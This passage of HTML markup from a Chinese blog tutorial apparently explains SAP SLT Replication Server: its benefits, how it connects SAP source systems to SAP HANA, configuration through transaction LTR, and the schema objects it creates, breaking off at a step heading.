&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;SLT可以处理簇表和池表&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;在&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;This support automatically non-Unicode and Unicode conversion during load/replication.&quot;&gt;加载/复制期间&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;This support automatically non-Unicode and Unicode conversion during load/replication.&quot;&gt;支持&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;非Unicode和Unicode的&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;This support automatically non-Unicode and Unicode conversion during load/replication.&quot;&gt;自动&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;转换。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;This support automatically non-Unicode and Unicode conversion during load/replication.&quot;&gt;与SAP HANA Studio有着完全的集成。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;This support automatically non-Unicode and Unicode conversion during load/replication.&quot;&gt;SLT有表设置和转换能力。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;This support automatically non-Unicode and Unicode conversion during load/replication.&quot;&gt;可以通过SAP HANA Solution Manager监控。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt; SLT的全称是 SAP Landscape Transformation&lt;/p&gt;
&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;This support automatically non-Unicode and Unicode conversion during load/replication.&quot;&gt;本文链接：&lt;a id=&quot;Editor_Edit_hlEntryLink&quot; title=&quot;view: SLT&quot; href=&quot;http://www.cnblogs.com/hhelibeb/p/8258915.html&quot; target=&quot;_blank&quot;&gt;http://www.cnblogs.com/hhelibeb/p/8258915.html&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;This support automatically non-Unicode and Unicode conversion during load/replication.&quot;&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;SAP/非SAP系统的SAP SLT服务器的架构概述如下：&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;This support automatically non-Unicode and Unicode conversion during load/replication.&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;SAP系统和SAP HANA之间的SLT连接架构&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;This support automatically non-Unicode and Unicode conversion during load/replication.&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;SAP SLT Replication Server将所有元数据表定义从ABAP源系统转换为SAP HANA的&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;元数据表定义&lt;/span&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;This support automatically non-Unicode and Unicode conversion during load/replication.&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;对于SAP源，SLT连接具有以下功能：&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;This support automatically non-Unicode and Unicode conversion during load/replication.&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;在复制表时，&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;SAP SLT &lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;This support automatically non-Unicode and Unicode conversion during load/replication.&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;Replication Server&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;将在源系统中创建日志表。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;This support automatically non-Unicode and Unicode conversion during load/replication.&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;读取引擎在SAP源系统中创建。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;This support automatically non-Unicode and Unicode conversion during load/replication.&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;SAP SLT和SAP源系统之间的连接基于&lt;a href=&quot;http://www.cnblogs.com/hhelibeb/p/8066753.html&quot; target=&quot;_blank&quot;&gt;RFC&lt;/a&gt;连接。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;This support automatically non-Unicode and Unicode conversion during load/replication.&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;SAP SLT和SAP HANA之间的连接基于DB连接。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;This support automatically non-Unicode and Unicode conversion during load/replication.&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;与“SYSTEM”具有相同权限的数据库用户可以在SAP SLT和SAP HANA数据库之间创建连接。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;This support automatically non-Unicode and Unicode conversion during load/replication.&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;img title=&quot;SAP SLT Connection between SAP System and SAP HANA DATABASE&quot; src=&quot;https://images2017.cnblogs.com/blog/994049/201801/994049-20180114100342332-1327052117.png&quot; alt=&quot;SAP SLT Connection between SAP System and SAP HANA DATABASE&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;图  SAP SLT连接SAP系统和SAP HANA数据库&lt;/p&gt;
&lt;h2&gt;在SAP源系统中配置SLT服务器&lt;/h2&gt;
&lt;p&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;首先，我们需要配置SAP SLT &lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;SLT server can be installed on the separate system or on SAP ECC System. &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;Benefit of SLT system is as below-     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;During replicating data in real-time, we can migrate data in SAP HANA Format.     &quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span title=&quot;This support automatically non-Unicode and Unicode conversion during load/replication.&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;Replication Server&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;以连接SAP源服务器和SAP HANA数据库。 &lt;span&gt;事务代码LTR用于在SAP&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;源服务器&lt;/span&gt;和SAP SLT之间创建连接。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;strong&gt;步骤1&lt;/strong&gt;）登录到SAP SLT服务器，并从SAP SLT复制服务器调用事务“LTR”。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/994049/201801/994049-20180114100715347-454779052.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;系统会弹出一个Web Dynpro窗口，用于登陆到SAP SLT服务器。&lt;/p&gt;
&lt;p&gt;输入用户名密码并登录。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/994049/201801/994049-20180114100820551-1844640413.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;会出现一个如下的弹出窗，用于配置：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/994049/201801/994049-20180114100847519-439406561.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;点击“New”按钮，创建一个新的配置。&lt;/p&gt;
&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;strong&gt;步骤2&lt;/strong&gt;）在本步骤：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;输入配置名和描述。&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;选择SAP系统作为源系统。&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;输入SAP系统的RFC连接（destination）。&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;输入用户名/密码/主机名和实例编号。&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;输入作业选项细节。&lt;/span&gt;&lt;/span&gt;
&lt;ul&gt;&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;数据传输任务编号&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;计算任务编号&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;选择复制选项为实时。&lt;/li&gt;
&lt;li&gt;一旦所有选项维护完毕，点击‘OK’来创建一个SLT的新&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;SCHEMA&lt;/span&gt;。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;现在已经添加并激活了名为“SLTECC”的新配置：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2017.cnblogs.com/blog/994049/201801/994049-20180114101243847-1895898283.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;成功配置SAP SLT服务器后，SAP SLT服务器会自动为SAP HANA数据库创建数据库连接（当通过事务LTR创建新的配置时）。不需要手动创建它。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;下一步，我们将数据从SAP源导入SAP HANA。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3&gt;通过SLT将数据从SAP源导入至SAP HANA&lt;/h3&gt;
&lt;p&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;一旦我们成功配置了SAP SLT服务器，SAP HANA数据库就会创建一个和SAP SLT中的配置同名的SCHEMA。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;该&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;SCHEMA&lt;/span&gt;包含以下对象：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;strong&gt;1 Schema&lt;/strong&gt; - SLTECC.&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;strong&gt;1 User&lt;/strong&gt; – SLTECC.&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;strong&gt;1 Privileges&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;8 Tables&lt;/strong&gt;：
&lt;ul&gt;&lt;li&gt;DD02L (SAP Tables Name )&lt;/li&gt;
&lt;li&gt;DD02T (SAP Table Texts)&lt;/li&gt;
&lt;li&gt;RS_LOG_FILES&lt;/li&gt;
&lt;li&gt;RS_MESSAGE&lt;/li&gt;
&lt;li&gt;RS_ORDER&lt;/li&gt;
&lt;li&gt;RS_ORDER_TEXT&lt;/li&gt;
&lt;li&gt;RS_SCHEMA_MAP&lt;/li&gt;
&lt;li&gt;RS_STATUS.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;4 Role -&lt;/strong&gt;
&lt;ul&gt;&lt;li&gt;SLTECC_DATA_PROV&lt;/li&gt;
&lt;li&gt;SLTECC_DATA_POWER_USER&lt;/li&gt;
&lt;li&gt;SLTECC_DATA_USER_ADMIN&lt;/li&gt;
&lt;li&gt;SLTECC_DATA_SELECT&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2 Procedures&lt;/strong&gt;
&lt;ul&gt;&lt;li&gt;RS_GRANT_ACCESS&lt;/li&gt;
&lt;li&gt;RS_REVOKE_ACCESS&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;所有配置完成后，现在我们从SAP ECC（ERP中央组件）中加载一个表。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;strong&gt;步骤1&lt;/strong&gt;）要将表从SAP ECC加载到SAP HANA数据库，请按照以下步骤：&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
